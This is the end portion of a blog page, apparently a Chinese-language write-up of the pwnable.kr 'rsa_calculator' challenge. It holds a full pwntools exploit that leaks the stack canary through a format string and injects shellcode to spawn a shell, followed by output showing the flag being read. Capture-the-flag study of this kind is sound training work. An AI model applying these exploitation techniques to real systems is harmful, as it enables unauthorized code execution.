class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">strToHex</span><span class="params">(s)</span>:</span></span><br><span class="line">    ret = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">        ret += <span class="string">'&#123;:02x&#125;'</span>.format(ord(i))</span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">work</span><span class="params">(DEBUG)</span>:</span></span><br><span class="line">    context(arch=<span class="string">'amd64'</span>,os=<span class="string">'linux'</span>,log_level=<span class="string">'info'</span>)</span><br><span class="line">    <span class="keyword">if</span> DEBUG:</span><br><span class="line">        r = process(<span class="string">'./rsa_calculator'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">'pwnable.kr'</span>,<span class="number">9012</span>)</span><br><span class="line">        </span><br><span class="line">    pri_addr = <span class="number">0x602960</span></span><br><span class="line">        </span><br><span class="line">    <span class="comment">#set key</span></span><br><span class="line">    r.sendline(<span class="string">'1'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'p : '</span>)</span><br><span class="line">    r.sendline(<span class="string">'61\n53\n17\n2753'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#get stack canary</span></span><br><span class="line">    r.sendline(<span class="string">'2\n1024\n%205$016lx'</span>)</span><br><span class="line">    r.recvuntil(<span class="string">'(hex encoded) -\n'</span>)</span><br><span class="line">    cipher = r.recvline()</span><br><span class="line">    r.sendline(<span class="string">'3\n1024\n'</span>+cipher)</span><br><span class="line">    r.recvuntil(<span class="string">'- decrypted result -\n'</span>)</span><br><span class="line">    stack_canary = int(r.recvline(),<span class="number">16</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#get shell</span></span><br><span class="line">    r.sendline(<span class="string">'1\n3\n29312\n1\n58623'</span>) <span class="comment">#asm('jmp rsp')=0xe4ff=58623</span></span><br><span class="line">    r.recvuntil(<span class="string">'&gt; '</span>)</span><br><span class="line">    tmp = strToHex(<span class="string">'a'</span>*<span class="number">8</span>+p64(stack_canary)+<span class="string">'a'</span>*<span class="number">8</span>+p64(pri_addr)+asm(shellcraft.sh())) <span class="comment">#set retaddr=pri_addr</span></span><br><span class="line">    r.sendline(<span class="string">'3\n1024\n'</span>+strToHex(tmp+<span class="string">'30'</span>*(<span class="number">1024</span>-len(tmp))))</span><br><span class="line">    </span><br><span class="line">    r.interactive()</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">work(<span class="keyword">False</span>)</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">root@1:~/桌面/<span class="built_in">test</span>$ python 1.py </span><br><span class="line">[+] Opening connection to pwnable.kr on port 9012: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">-SET RSA KEY-</span><br><span class="line">p : q : p, q, <span class="built_in">set</span> to 3, 29312</span><br><span class="line">-current private key and public keys-</span><br><span class="line">public key : 11 00 00 00 a1 0c 00 00 </span><br><span class="line">public key : c1 0a 00 00 a1 0c 00 00 </span><br><span class="line">N <span class="built_in">set</span> to 87936, PHI <span class="built_in">set</span> to 58622</span><br><span class="line"><span class="built_in">set</span> public key exponent e : <span class="built_in">set</span> private key exponent d : key <span class="built_in">set</span> ok</span><br><span class="line">pubkey(e,n) : (1(00000001), 87936(00015780))</span><br><span class="line">prikey(d,n) : (58623(0000e4ff), 87936(00015780))</span><br><span class="line"></span><br><span class="line">- select menu -</span><br><span class="line">- 1. : <span class="built_in">set</span> key pair</span><br><span class="line">- 2. : encrypt</span><br><span class="line">- 3. : decrypt</span><br><span class="line">- 4. : <span class="built_in">help</span></span><br><span class="line">- 5. : <span class="built_in">exit</span></span><br><span class="line">&gt; how long is your data?(max=1024) : paste your hex encoded data</span><br><span class="line">- decrypted result -</span><br><span class="line"></span><br><span class="line">$ ls</span><br><span class="line">flag</span><br><span class="line"><span class="built_in">log</span></span><br><span class="line">rsa_calculator</span><br><span class="line">super.pl</span><br><span class="line">$ cat flag</span><br><span class="line">what a stupid buggy rsa calculator! :(</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>读逆向代码要细心，不能急躁，否则可能会花很多时间。</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwnable-kr/" rel="tag"># pwnable.kr</a>
+          
+            <a href="/tags/PWN/" rel="tag"># PWN</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/03/10/pwnable.kr-echo2/" rel="next" title="pwnable.kr-echo2">
+                <i class="fa fa-chevron-left"></i> pwnable.kr-echo2
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/04/24/pwnable.kr-crypto1/" rel="prev" title="pwnable.kr-crypto1">
+                pwnable.kr-crypto1 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Inhaltsverzeichnis
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Übersicht
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">r00tnb</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">44</span>
+                    <span class="site-state-item-name">Artikel</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">4</span>
+                    <span class="site-state-item-name">Kategorien</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">7</span>
+                    <span class="site-state-item-name">Tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#分析"><span class="nav-number">2.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-number">3.</span> <span class="nav-text">总结</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">r00tnb</span>
+
+  
+
+  
+</div>
+
+
+
+
+  <div class="powered-by">Erstellt mit  <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> v3.7.1</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme – <a class="theme-link" target="_blank" href="https://theme-next.org">NexT.Gemini</a> v6.3.0</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.3.0"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=6.3.0"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=6.3.0"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.3.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.3.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.3.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
